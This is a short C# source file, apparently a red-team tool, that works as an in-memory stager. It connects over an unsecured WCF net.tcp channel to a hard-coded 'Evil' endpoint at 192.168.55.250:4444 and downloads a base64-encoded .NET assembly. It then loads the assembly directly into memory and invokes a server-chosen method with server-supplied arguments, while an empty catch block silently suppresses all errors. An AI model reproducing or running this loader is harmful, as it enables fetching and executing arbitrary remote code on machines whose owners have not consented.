using System;
using System.ServiceModel;
using System.Reflection;
using System.Linq;

/*
Author: @anthemtotheego
License: BSD 3-Clause    
*/

class Program
{
    static void Main(string[] args)
    {
        try
        {
            var endPoint = new EndpointAddress("net.tcp://192.168.55.250:4444/Evil");
            var binding = new NetTcpBinding(SecurityMode.None);
            binding.MaxReceivedMessageSize = Int32.MaxValue;
            var channel = new ChannelFactory<Interface2>(binding, endPoint);
            var client = channel.CreateChannel();

            //Return source from server
            String[] source = client.b64Assembly2();

            //Arguments
            object[] cmd = source.Skip(3).ToArray();

            //Decode and load assembly
            var decode = Convert.FromBase64String(source[0]);
            var assemblyLoad = Assembly.Load(decode);

            //Get types, create instance, and execute
            Type[] type = assemblyLoad.GetTypes();
            int x = Convert.ToInt32(source[1]);              
            object o = Activator.CreateInstance(type[x]);
            object[] arguments = new object[] { new string[] { source[3] } };
            type[x].GetMethod(source[2]).Invoke(o, arguments);
        }
        catch
        { }
    }
}

//WCF Public Server Interface
[ServiceContract]
public interface Interface2
{
    [OperationContract]
    String[] b64Assembly2();
}
